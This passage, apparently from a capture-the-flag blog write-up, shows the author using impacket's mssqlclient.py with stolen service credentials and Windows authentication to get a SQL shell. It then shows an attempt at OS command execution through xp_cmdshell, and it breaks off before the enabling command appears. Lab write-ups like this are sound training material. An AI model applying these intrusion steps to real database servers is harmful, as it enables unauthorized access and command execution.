style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/main.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">122</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">module</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/main.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">115</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    run_cli_with</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mssqlcli_options</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/main.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">52</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> run_cli_with</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mssqlcli.connect_to_database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/mssql_cli.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">278</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> connect_to_database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    owner_uri, error_messages </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.mssqlcliclient_main.connect_to_database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">91</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> connect_to_database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    owner_uri, error_messages </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self._execute_connection_request_with</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">connection_params</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">180</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _execute_connection_request_with</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> connection_request.get_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">67</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">return</span><span class="token plain"> self.response_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">error</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/connectionservice.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">22</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> response_error</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    u</span><span class="token string" style="color:#e3116c">&#x27;ownerUri&#x27;</span><span class="token builtin class-name">:</span><span class="token plain"> cls.owner_uri,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AttributeError: </span><span class="token builtin class-name">type</span><span class="token plain"> object </span><span class="token string" style="color:#e3116c">&#x27;ConnectionRequest&#x27;</span><span class="token plain"> has no attribute </span><span class="token string" style="color:#e3116c">&#x27;owner_uri&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I decided that I had wasted enough time debugging a third party library when there are so many other out there that do the same operation. After all, I wanted to capture the flag in an efficient as time as possible. Therefore, I decided to try <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer"><code>impacket</code></a>.
Installation was done using <code>pip</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> impacket</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And used the documentation to run the following command to connect to SQL Server but I received some unknown error which seemed to originate from switching to TLS:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;SSL routines&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;state_machine&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;internal error&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found that I could get more information by specifying the <code>-debug</code> flag which provided the stacktrace:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Exception:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/EGG-INFO/scripts/mssqlclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">179</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">module</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ms_sql.login</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">options.db, username, password, domain, options.hashes, options.windows_auth</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">917</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    tls.do_handshake</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/lib/python3/dist-packages/OpenSSL/SSL.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">1915</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> do_handshake</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    self._raise_ssl_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self._ssl, result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/lib/python3/dist-packages/OpenSSL/SSL.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">1647</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _raise_ssl_error</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _raise_current_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/lib/python3/dist-packages/OpenSSL/_util.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">54</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> exception_from_error_queue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise exception_type</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">errors</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OpenSSL.SSL.Error: </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;SSL routines&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;state_machine&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;internal error&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;SSL routines&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;state_machine&#x27;</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&#x27;internal error&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>From the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.
Doing some research, I found that <a href="https://github.com/SecureAuthCorp/impacket/issues/856" target="_blank" rel="noopener noreferrer">this problem</a> also happened to other people and someone had found <a href="https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208" target="_blank" rel="noopener noreferrer">a solution by modifying the TLS version from v1 to v2</a>. I performed the same changes in the <code>~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py</code> and reran the same command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">&#x27;sql_svc&#x27;</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This time around I got a different error message, a failed login with the user <code>sql_svc</code>. I found a way around that by specifying the <code>-windows-auth</code> flag which enables using <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication" target="_blank" rel="noopener noreferrer">Kerberos\Windows authentication</a>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> -windows-auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">DATABASE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: master, New Value: master</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token environment constant" style="color:#36acaa">LANGUAGE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: , New Value: us_english</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PACKETSIZE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain">, New Value: </span><span class="token number" style="color:#36acaa">16192</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Changed database context to </span><span class="token string" style="color:#e3116c">&#x27;master&#x27;</span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Changed language setting to us_english.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ACK: Result: </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> - Microsoft SQL Server </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">140</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3232</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Press </span><span class="token builtin class-name">help</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> extra shell commands</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="running-system-commands-from-sql-server-shell">Running System Commands from SQL Server Shell<a href="#running-system-commands-from-sql-server-shell" class="hash-link" aria-label="Direct link to Running System Commands from SQL Server Shell" title="Direct link to Running System Commands from SQL Server Shell">​</a></h2>
<p>Reading through official Microsoft documentation, I found that we can actually <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" target="_blank" rel="noopener noreferrer">run system commands from within SQL Server using the <code>xp_cmdshell</code></a>. This is exactly what I was looking for as it enabled me to be able to interact with the remote target system. When I attempted to run this cmdlet, I received the following error:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;echo test&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: SQL Server blocked access to procedure </span><span class="token string" style="color:#e3116c">&#x27;sys.xp_cmdshell&#x27;</span><span class="token plain"> of component </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain"> because this component is turned off as part of the security configuration </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> this server. A system administrator can </span><span class="token builtin class-name">enable</span><span class="token plain"> the use of </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain"> by using sp_configure. For </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> information about enabling </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain">, search </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> SQL Server Books Online.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Seems that we need to enable the use of the command somehow. Reading the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15#remarks" target="_blank" rel="noopener noreferrer">Microsoft documentation</a> in greater depth, I found that the cmdlet is disabled by default. It also gave me the information I needed in order to enable it:</p>
<blockquote>
<p><code>xp_cmdshell</code> is a very powerful feature and disabled by default. <code>xp_cmdshell</code> can be enabled and disabled by using the Policy-Based Management or by executing <code>sp_configure</code>. For more information, see <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver15" target="_blank" rel="noopener noreferrer">Surface Area Configuration</a> and <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15" target="_blank" rel="noopener noreferrer"><code>xp_cmdshell</code> Server Configuration Option</a>.</p>
</blockquote>
<p>I ran the following command to enable it:</p>
